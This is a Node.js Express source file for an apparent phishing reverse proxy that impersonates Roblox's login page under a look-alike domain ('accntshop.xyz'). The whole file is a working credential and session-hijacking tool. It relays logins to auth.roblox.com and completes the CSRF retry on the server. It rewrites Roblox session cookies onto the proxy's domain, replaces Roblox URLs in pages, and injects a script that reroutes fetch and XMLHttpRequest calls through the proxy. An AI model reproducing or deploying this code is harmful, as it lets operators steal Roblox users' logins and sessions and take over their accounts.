const express = require('express');
const { createProxyMiddleware, responseInterceptor } = require('http-proxy-middleware');
const https = require('https');

const app = express();

console.log('='.repeat(60));
console.log('🔒 PURE LOGIN PROXY - FIXED COOKIE DOMAIN');
console.log('='.repeat(60));

// Domain map
const SUBDOMAIN_MAP = {
    'auth-api':       'https://auth.roblox.com',
    'apis-api':       'https://apis.roblox.com',
    'api-api':        'https://api.roblox.com',
    'economy-api':    'https://economy.roblox.com',
    'users-api':      'https://users.roblox.com',
    'catalog-api':    'https://catalog.roblox.com',
    'games-api':      'https://games.roblox.com',
    'thumbnails-api': 'https://thumbnails.roblox.com',
    'ecsv2-api':      'https://ecsv2.roblox.com',
    'js-cdn':         'https://js.rbxcdn.com',
    'css-cdn':        'https://css.rbxcdn.com',
    'images-cdn':     'https://images.rbxcdn.com',
    'static-cdn':     'https://static.rbxcdn.com',
    'rbxcdn':         'https://www.rbxcdn.com',
    'content-cdn':    'https://content.roblox.com',
};

const CDN_PREFIXES = new Set(['js-cdn', 'css-cdn', 'images-cdn', 'static-cdn', 'rbxcdn', 'content-cdn']);

const BROWSER_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36';

// =========================
// Helpers
// =========================
function rewriteCookies(cookies, host) {
    if (!cookies) return cookies;
    return cookies.map(cookie => {
        return cookie
            .replace(/Domain=\.?roblox\.com/gi, `Domain=.${host}`)
            .replace(/\bSecure\b/gi, 'Secure; SameSite=None');
    });
}

function setCorsHeaders(proxyRes, req) {
    delete proxyRes.headers['access-control-allow-origin'];
    delete proxyRes.headers['access-control-allow-credentials'];
    delete proxyRes.headers['access-control-allow-methods'];
    delete proxyRes.headers['access-control-allow-headers'];
    delete proxyRes.headers['access-control-expose-headers'];

    const origin = req.headers['origin'] || `https://${req.headers.host}`;
    proxyRes.headers['access-control-allow-origin'] = origin;
    proxyRes.headers['access-control-allow-credentials'] = 'true';
    proxyRes.headers['access-control-allow-methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
    proxyRes.headers['access-control-allow-headers'] = 'Content-Type, x-csrf-token, Authorization, rbx-device-id';

    if (proxyRes.headers['x-csrf-token']) {
        proxyRes.headers['access-control-expose-headers'] = 'x-csrf-token';
    }
}

// =============================================
// Server-side CSRF retry for /v2/login
// Roblox's frontend checks hostname === 'roblox.com' before retrying the 403.
// On a custom domain that check fails, so the browser never retries.
// We handle the entire two-step handshake here on the server instead.
// =============================================
function doLoginRequest(body, cookies, csrfToken, ua) {
    return new Promise((resolve, reject) => {
        const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
        const headers = {
            'Content-Type': 'application/json',
            'Origin': 'https://www.roblox.com',
            'Referer': 'https://www.roblox.com/login',
            'User-Agent': ua || BROWSER_UA,
        };

        if (cookies) headers['Cookie'] = cookies;
        if (csrfToken) headers['X-CSRF-TOKEN'] = csrfToken;

        const options = {
            hostname: 'auth.roblox.com',
            path: '/v2/login',
            method: 'POST',
            headers,
        };

        const reqOut = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: data }));
        });

        reqOut.on('error', reject);
        reqOut.write(bodyStr);
        reqOut.end();
    });
}

// Intercept login POST before it hits the proxy middleware
app.use('/auth-api/v2/login', express.json({ type: '*/*' }), async (req, res, next) => {
    if (req.method !== 'POST') return next();

    const host = req.headers.host || 'accntshop.xyz';
    const ua = req.headers['user-agent'] || BROWSER_UA;
    const incomingCookies = req.headers['cookie'] || '';

    console.log('🔑 LOGIN ATTEMPT (server-side CSRF handler)');

    try {
        const body = req.body;

        // Step 1: First attempt — no CSRF token
        const first = await doLoginRequest(body, incomingCookies, null, ua);
        console.log(`   Step 1 response: ${first.status}`);

        let finalResponse = first;

        // Step 2: If 403 and Roblox sent us a token, retry with it immediately
        if (first.status === 403 && first.headers['x-csrf-token']) {
            const csrfToken = first.headers['x-csrf-token'];
            console.log(`   Got CSRF token: ${csrfToken} — retrying...`);

            // Carry forward any cookies Roblox set on step 1
            const step1Cookies = first.headers['set-cookie'];
            let cookieHeader = incomingCookies;
            if (step1Cookies) {
                const rawCookies = step1Cookies.map(c => c.split(';')[0]).join('; ');
                cookieHeader = cookieHeader ? `${cookieHeader}; ${rawCookies}` : rawCookies;
            }

            const second = await doLoginRequest(body, cookieHeader, csrfToken, ua);
            console.log(`   Step 2 response: ${second.status}`);
            finalResponse = second;
        }

        // Rewrite and forward the final response back to the browser
        const finalCookies = finalResponse.headers['set-cookie'];
        const rewritten = rewriteCookies(finalCookies, host);

        const origin = req.headers['origin'] || `https://${host}`;

        res.status(finalResponse.status);
        res.set('Content-Type', 'application/json');
        res.set('Access-Control-Allow-Origin', origin);
        res.set('Access-Control-Allow-Credentials', 'true');
        if (finalResponse.headers['x-csrf-token']) {
            res.set('X-CSRF-TOKEN', finalResponse.headers['x-csrf-token']);
            res.set('Access-Control-Expose-Headers', 'x-csrf-token');
        }
        if (rewritten && rewritten.length) {
            res.set('Set-Cookie', rewritten);
        }

        console.log(`✅ Login final status: ${finalResponse.status}`);
        res.send(finalResponse.body);

    } catch (err) {
        console.error('[login] Error:', err.message);
        res.status(502).send('Proxy error');
    }
});

function buildInjectedScript(host) {
    const domainEntries = Object.entries(SUBDOMAIN_MAP)
        .map(([prefix, target]) => `[${JSON.stringify(target)}, ${JSON.stringify(`https://${host}/${prefix}`)}]`)
        .join(',\n');

    return `<script>
(function() {
    var PROXY_HOST = ${JSON.stringify(`https://${host}`)};
    var DOMAIN_MAP = [
        ${domainEntries},
        ["https://www.roblox.com", PROXY_HOST],
        ["http://www.roblox.com",  PROXY_HOST],
        ["https://roblox.com",     PROXY_HOST],
        ["http://roblox.com",      PROXY_HOST]
    ];

    function rewriteUrl(url) {
        if (!url || typeof url !== 'string') return url;
        for (var i = 0; i < DOMAIN_MAP.length; i++) {
            var from = DOMAIN_MAP[i][0];
            var to   = DOMAIN_MAP[i][1];
            if (url.indexOf(from) === 0) {
                return to + url.slice(from.length);
            }
        }
        return url;
    }

    var _fetch = window.fetch;
    window.fetch = function(resource, init) {
        if (typeof resource === 'string') resource = rewriteUrl(resource);
        else if (resource && resource.url) resource = new Request(rewriteUrl(resource.url), resource);
        return _fetch.call(this, resource, init);
    };

    var _open = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {
        var args = Array.prototype.slice.call(arguments);
        args[1] = rewriteUrl(url);
        return _open.apply(this, args);
    };
})();
</script>`;
}

function escapeRegex(str) {
    return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

function rewriteUrls(body, host) {
    let result = body;

    for (const [prefix, target] of Object.entries(SUBDOMAIN_MAP)) {
        const domain = target.replace(/^https?:/, '');
        result = result.replace(new RegExp(`https?:${escapeRegex(domain)}`, 'g'), `https://${host}/${prefix}`);
        result = result.replace(new RegExp(escapeRegex(domain), 'g'), `//${host}/${prefix}`);
    }

    result = result.replace(/https?:\/\/www\.roblox\.com/g, `https://${host}`);
    result = result.replace(/\/\/www\.roblox\.com/g, `//${host}`);
    result = result.replace(/https?:\/\/roblox\.com/g, `https://${host}`);

    return result;
}

// =========================
// Logging
// =========================
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
    next();
});

// =========================
// OPTIONS preflight
// =========================
app.options('*', (req, res) => {
    const origin = req.headers['origin'] || `https://${req.headers.host}`;
    res.set({
        'access-control-allow-origin': origin,
        'access-control-allow-credentials': 'true',
        'access-control-allow-methods': 'GET, POST, PUT, DELETE, OPTIONS',
        'access-control-allow-headers': 'Content-Type, x-csrf-token, Authorization, rbx-device-id',
        'access-control-max-age': '86400',
    });
    res.sendStatus(200);
});

// =========================
// AUTH API (all routes except /v2/login which is handled above)
// =========================
app.use('/auth-api', createProxyMiddleware({
    target: 'https://auth.roblox.com',
    changeOrigin: true,
    secure: true,
    pathRewrite: { '^/auth-api': '' },
    proxyTimeout: 10000,
    timeout: 10000,

    on: {
        proxyReq: (proxyReq, req) => {
            proxyReq.setHeader('origin', 'https://www.roblox.com');
            proxyReq.setHeader('referer', 'https://www.roblox.com/login');
            proxyReq.setHeader('user-agent', req.headers['user-agent'] || BROWSER_UA);

            if (req.headers['x-csrf-token']) {
                proxyReq.setHeader('x-csrf-token', req.headers['x-csrf-token']);
            }
        },

        proxyRes: (proxyRes, req) => {
            if (proxyRes.headers['set-cookie']) {
                const host = req.headers.host || 'accntshop.xyz';
                proxyRes.headers['set-cookie'] = rewriteCookies(proxyRes.headers['set-cookie'], host);
            }
            setCorsHeaders(proxyRes, req);
        },

        error: (err, req, res) => {
            console.error('[auth-api] Error:', err.message);
            res.status(502).send('Proxy error');
        }
    }
}));

// =========================
// APIS API
// =========================
app.use('/apis-api', createProxyMiddleware({
    target: 'https://apis.roblox.com',
    changeOrigin: true,
    secure: true,
    pathRewrite: { '^/apis-api': '' },
    proxyTimeout: 10000,
    timeout: 10000,

    on: {
        proxyReq: (proxyReq, req) => {
            proxyReq.setHeader('origin', 'https://www.roblox.com');
            proxyReq.setHeader('referer', 'https://www.roblox.com/login');
            proxyReq.setHeader('user-agent', req.headers['user-agent'] || BROWSER_UA);

            if (req.headers['x-csrf-token']) {
                proxyReq.setHeader('x-csrf-token', req.headers['x-csrf-token']);
            }
        },

        proxyRes: (proxyRes, req) => {
            if (proxyRes.headers['set-cookie']) {
                const host = req.headers.host || 'accntshop.xyz';
                proxyRes.headers['set-cookie'] = rewriteCookies(proxyRes.headers['set-cookie'], host);
            }
            setCorsHeaders(proxyRes, req);
        },

        error: (err, req, res) => {
            console.error('[apis-api] Error:', err.message);
            res.status(502).send('Proxy error');
        }
    }
}));

// =========================
// OTHER APIS
// =========================
for (const [prefix, target] of Object.entries(SUBDOMAIN_MAP)) {
    if (prefix === 'auth-api' || prefix === 'apis-api') continue;

    app.use(`/${prefix}`, createProxyMiddleware({
        target,
        changeOrigin: true,
        secure: true,
        pathRewrite: { [`^/${prefix}`]: '' },
        proxyTimeout: 10000,
        timeout: 10000,

        on: {
            proxyReq: (proxyReq, req) => {
                proxyReq.setHeader('user-agent', req.headers['user-agent'] || BROWSER_UA);
            },

            proxyRes: (proxyRes, req) => {
                setCorsHeaders(proxyRes, req);
            },

            error: (err, req, res) => {
                console.error(`[${prefix}] Error:`, err.message);
                res.status(502).send('Proxy error');
            }
        }
    }));
}

// =========================
// MAIN SITE
// =========================
app.use('/', createProxyMiddleware({
    target: 'https://www.roblox.com',
    changeOrigin: true,
    secure: true,
    selfHandleResponse: true,
    proxyTimeout: 10000,
    timeout: 10000,

    pathRewrite: (path) => (path === '/' ? '/login' : path),

    on: {
        proxyReq: (proxyReq, req) => {
            proxyReq.setHeader('user-agent', req.headers['user-agent'] || BROWSER_UA);
        },

        proxyRes: responseInterceptor(async (buffer, proxyRes, req, res) => {
            const ct = proxyRes.headers['content-type'] || '';

            if (ct.includes('text/html')) {
                const host = req.headers.host;
                let body = buffer.toString('utf8');

                body = rewriteUrls(body, host);

                const script = buildInjectedScript(host);
                body = body.replace('<head', `<head>${script}`);

                return body;
            }

            return buffer;
        }),

        error: (err, req, res) => {
            console.error('[main] Error:', err.message);
            res.status(502).send('Proxy error');
        }
    }
}));

// =========================
// START SERVER
// =========================
const PORT = process.env.PORT || 8080;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Proxy running on port ${PORT}`);
});
